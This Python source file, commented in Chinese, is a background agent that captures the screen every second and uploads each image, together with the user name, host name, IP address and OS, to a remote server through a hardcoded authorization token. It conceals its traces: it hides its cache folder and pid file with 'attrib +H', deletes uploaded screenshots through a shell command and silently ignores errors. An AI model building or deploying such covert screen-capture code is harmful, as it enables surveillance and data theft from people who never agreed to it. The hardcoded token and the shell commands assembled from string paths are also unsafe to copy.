import datetime,schedule,os,platform,socket,requests,logging,json,subprocess
from PIL import ImageGrab

###重定义允许json序列化datetime类型数据
class CJsonEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, datetime.datetime):
            return obj.strftime('%Y-%m-%d %H:%M:%S')
        elif isinstance(obj, datetime):
            return obj.strftime("%Y-%m-%d")
        else:
            return json.JSONEncoder.default(self, obj)


def screen():
    #截图并将文件和相关信息发给远端服务器
    im = ImageGrab.grab()
    image1 = os.path.join(image_path,'%s.jpg'%str(c))
    im.save(image1)
    im.close()
    created_time = datetime.datetime.fromtimestamp(os.stat(image1).st_ctime)
    data1 = {'enctype': 'multipart/form-data', 'os': host_info, 'host_name': host_name, 'user': host_user,
             'ip': host_ip,'created_at':created_time,'length':(im.size)[0],'pid':file_pid,
             'width':(im.size)[-1],'file_size':os.stat(image1).st_size,'file_abs_path':file_abs_path,'file_name':file_name}
    f =  open(image1, 'rb')
    file1 = {'file': f}
    try:
        res = requests.post(update_url,headers={"Authorization":"token 4616eac1a3e2419d53d0fdb870850a83d36f3bf3"}, data=data1, files=file1)
        if res.status_code == 200:
              info = json.loads(res.text)
              # 如果能访问到远程服务器直接将图片和信息发到远程服务器上，并删除本地图片
              if info.get('data')== 'success':
                  cmd = 'del %s '%image1
                  f.close()
                  subprocess.call(cmd,shell=True)
    except Exception as e:
        #logging.error(e)
        pass

##定义日志的格式
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s',
                    datefmt='%a, %d %b %Y %H:%M:%S',
                    filename='app.log',
                    filemode='a+')
#获取本地的进程相关信息

#获取本次程序的pid号
file_pid = os.getpid()
#获取程序的绝对路径
file_abs_path = os.path.abspath(__file__)
#获取程序名
file_name = os.path.basename(file_abs_path)
c=0
update_url = 'http://127.0.0.1:8000/api/upload_images/'
host_user = os.getenv('username') #当前主机用户
host_name = socket.gethostname() #获取主机名
#host_address = socket.gethostbyname(host_name)
host_info = platform.system() #获取操作系统类型
host_ip = socket.gethostbyname(host_name)#根据主机名获取ip

#判断主机类型定好相关执行路径
root_path = r'C:\ProgramData' if host_info == 'Windows' else ''
image_path = os.path.join(root_path, 'tmp')
local_pid_path = os.path.join(root_path,'pid.txt')
#本地缓存图片路径不存在先创建路径，并隐藏路径
if os.path.isdir(image_path) is False:
    os.system('mkdir %s' % image_path)
    os.system('attrib +H %s'%image_path)
#pid路径不存在先创建路径，并隐藏路径
if os.path.isfile(local_pid_path):
    os.system('attrib -H %s' % local_pid_path)
#打开Pid文件写入相关信息
with open(local_pid_path,'w',encoding='utf-8') as f:
    info= json.dumps({'pid':file_pid,'file_abs_path':r'D:\UGW_listen_demo\agent\dist\listen.exe'})
    f.write(info)
    f.close()
    os.system('attrib +H %s' %local_pid_path)

if __name__ == '__main__':

    try:
        #每秒执行
        schedule.every(1).seconds.do(screen)
        while True:
            schedule.run_pending()
            c +=1
    except Exception as e:
        logging.error(e)
        pass




